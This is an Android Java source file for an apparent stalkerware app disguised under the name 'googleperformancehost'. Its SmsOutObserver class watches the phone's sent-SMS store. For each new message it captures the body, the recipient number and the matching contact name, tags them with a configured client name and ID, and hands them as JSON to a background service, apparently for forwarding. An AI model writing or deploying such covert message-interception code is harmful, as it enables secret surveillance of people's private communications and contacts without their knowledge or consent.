package com.example.tiber.googleperformancehost.BroadcastReceivers;


import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.tiber.googleperformancehost.R;
import com.example.tiber.googleperformancehost.Services.Temporary.SentSMSHandlerIntentService;
import com.example.tiber.googleperformancehost.SharedClasses.Objects.SentSmsData;
import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;
import com.google.gson.Gson;


/**
 * Created by tiber on 11/6/2016.
 */

public class SmsOutObserver extends ContentObserver {

    //singleton
    private Context appContext;
    private static SmsOutObserver instance = null;

    private SmsOutObserver(Handler handler, Context appContext) {
        super(handler);
        this.appContext = appContext;
    }

    public static SmsOutObserver getInstance(Context appContext){
        if(instance == null)
        {
            instance = new SmsOutObserver(new Handler(),appContext);
        }
        return instance;

    }

    private static String lastAddedSms = "";
    @Override
    public void onChange(boolean selfChange) {
        if (appContext.getResources().getBoolean(R.bool.ENABLE_SMS_LOGGING) == true) {
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse("content://sms/sent");
            Cursor cur = appContext.getContentResolver().query(uriSMSURI, null, null, null, null);
            if (cur != null) {
                cur.moveToNext();
                String message = cur.getString(cur.getColumnIndex("body"));
                String number = cur.getString(cur.getColumnIndex("address"));

                if (number == null || number.length() <= 0) {
                    number = "Unknown";
                }

                cur.close();
                if (!lastAddedSms.equals(number + message)) {
                    SentSmsData sms = new SentSmsData(DateUtil.nowIntFormat(),
                            appContext.getResources().getString(R.string.CLIENT_NAME),
                            appContext.getResources().getInteger(R.integer.CLIENT_ID));
                    sms.setMessage(message);
                    sms.setNumber(number);
                    String name = getContactName(number);
                    sms.setName(name);

                    Intent startHandler = new Intent(appContext, SentSMSHandlerIntentService.class);
                    startHandler.putExtra("sms", new Gson().toJson(sms, SentSmsData.class));
                    appContext.startService(startHandler);

                    lastAddedSms = number + message;
                }
            }
        }
    }
    public String getContactName( String phoneNumber ) {
        if(phoneNumber == null )
            return null;
        ContentResolver cr = appContext.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if(cursor.moveToFirst()) {
            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }

        if(cursor != null && !cursor.isClosed()) {
            cursor.close();
        }

        return contactName;
    }
}
